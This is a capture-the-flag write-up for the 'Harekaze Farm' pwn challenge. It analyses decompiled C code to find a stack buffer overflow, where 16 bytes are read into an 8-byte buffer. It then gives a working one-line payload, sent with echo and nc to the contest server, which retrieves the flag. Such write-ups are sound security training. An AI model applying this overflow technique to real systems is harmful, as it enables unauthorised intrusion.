Harekaze Farm
===

**Category:** pwn, **Points:** 100, **Solves:** 122

```
nc problem.harekaze.com 20328

In Harekaze Farm, some animas is living. Let’s find them!

file: harekaze_farm
```

## Writeup

Let's run the binary and check what is actually does:

```
$ ./harekaze_farm
Welcome to Harekaze farm
Input a name of your favorite animal: cow
Input a name of your favorite animal: hen
Input a name of your favorite animal: fox
Begin to parade!
cow: "moo" "moo"
hen: "cluck" "cluck"
```

It just ask thrice for animal name and then prints what it does say.
Expect for fox :(

Now, let's take a look at the code. The binary contains debugging symbols,
so it is even easier to analyze. Here's the second half of main function:

```c
puts("Begin to parade!");
for ( j = 0; j <= 2; ++j )
{
  // sizeof(select_animals[0]) == 8
  if ( !strcmp((const char*) &select_animals[j], "cow") )
    puts("cow: \"moo\" \"moo\"");
  if ( !strcmp((const char*) &select_animals[j], "sheep") )
    puts("sheep: \"baa\" \"baa\"");
  if ( !strcmp((const char*) &select_animals[j], "goat") )
    puts("goat: \"bleat\" \"bleat\"");
  if ( !strcmp((const char*) &select_animals[j], "hen") )
    puts("hen: \"cluck\" \"cluck\"");
  if ( !strcmp((const char*) &select_animals[j], "isoroku") )
  {
    puts("isoroku: \"flag is here\" \"flag is here\"");
    // loads and prints the flag
  }
```

So, we need to put `"isoroku"` into `select_animals` table. Let's read the first
part of main:

```c
char s1[8]; // [sp+20h] [bp-110h]@2
__int64 v19; // [sp+28h] [bp-108h]@2

puts("Welcome to Harekaze farm");
for ( i = 0; i <= 2; ++i )
{
  *(_QWORD *)s1 = 0LL;
  v19 = 0LL;
  printf("Input a name of your favorite animal: ");
  s1[__read_chk(0LL, s1, 16LL, 16LL) - 1] = 0;
  if ( !strcmp(s1, "cow") )
  {
    v3 = (char *)&select_animals[i];
    *(_QWORD *)v3 = *(_QWORD *)s1;
    *((_QWORD *)v3 + 1) = v19;
  }
  // same if for another animals; it lacks isoroku though
```

So, we read some bytes into `s1`, then `strcmp` it with predefined animal names.
If there's a match, it saves its name to one cell of `select_animals` and
puts zero in next cell.

But wait... we read 16 bytes into `s1` which is `char[8]`! So we can overwrite
something on stack. What does lie right after `s1`? `v19`. And if we take
a look at the if branch, that's what we assume to be zero while zeroing next
element. So we can write any animal name we want!

So, that's how we can exploit it with echo:
```
$ echo -e 'cow\0....isoroku\0\n\n\n' | nc problem.harekaze.com 20328
Welcome to Harekaze farm
Input a name of your favorite animal: Input a name of your favorite animal: Input a name of your favorite animal: Begin to parade!
cow: "moo" "moo"
isoroku: "flag is here" "flag is here"
HarekazeCTF{7h1s_i5_V3ry_B3ginning_BoF}
```

###### By [mrowqa](https://github.com/Mrowqa) <artur.jamro@gmail.com>
